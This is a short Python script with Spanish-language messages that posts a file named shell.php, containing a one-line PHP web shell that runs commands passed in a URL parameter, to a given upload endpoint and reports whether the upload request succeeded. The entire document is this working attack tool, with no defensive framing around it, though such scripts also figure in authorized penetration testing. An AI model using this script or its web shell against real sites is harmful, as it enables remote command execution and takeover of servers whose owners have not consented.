import requests

def upload_malicious_files(upload_url, file_field="file", filename="shell.php", content="<?php system($_GET['cmd']); ?>"):
    print(f"\n[+] Probando carga de archivos maliciosos en: {upload_url}\n")

    files = {
        file_field: (filename, content)
    }

    try:
        response = requests.post(upload_url, files=files, timeout=10)

        if response.status_code in [200, 201]:
            print(f"   ✔ Solicitud enviada. Revisa si el archivo fue cargado exitosamente.")
        else:
            print(f"   ✘ Falló la carga (Status: {response.status_code})")

    except Exception as e:
        print(f"   [!] Error al intentar subir archivo: {e}")
